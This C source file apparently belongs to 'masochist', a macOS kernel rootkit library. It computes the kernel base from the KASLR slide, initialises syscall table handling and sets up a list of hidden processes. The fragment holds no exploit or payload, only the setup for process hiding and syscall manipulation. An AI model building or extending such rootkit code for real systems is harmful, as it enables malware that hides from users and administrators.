//
//  libmasochist.c
//  masochist
//
//  Created by Squiffy on 11/11/14.
//  Copyright (c) 2014 squiffypwn. All rights reserved.
//

#include "libmasochist.h"
#include "syscall.h"

struct mach_header_64 *kernel_header = NULL;
uint64_t kernel_base = 0x0;

extern LIST_HEAD(hiddenProcsHead, hiddenProc) hidden_procs_head;

kern_return_t
set_kernel_slide(uint64_t slide) {

    kernel_base = 0xffffff8000200000 + slide;
    kernel_header = (struct mach_header_64 *)kernel_base;
    
    return KERN_SUCCESS;
}

kern_return_t
libmasochist_init(uint64_t slide) {

    set_kernel_slide(slide);

    /* No panic is better */
    if(!kernel_header)
        return KERN_FAILURE;

    /* init sysent stuff */
    init_sysent();

    /* init the hidden procs list */
    LIST_INIT(&hidden_procs_head);

    return KERN_SUCCESS;

}
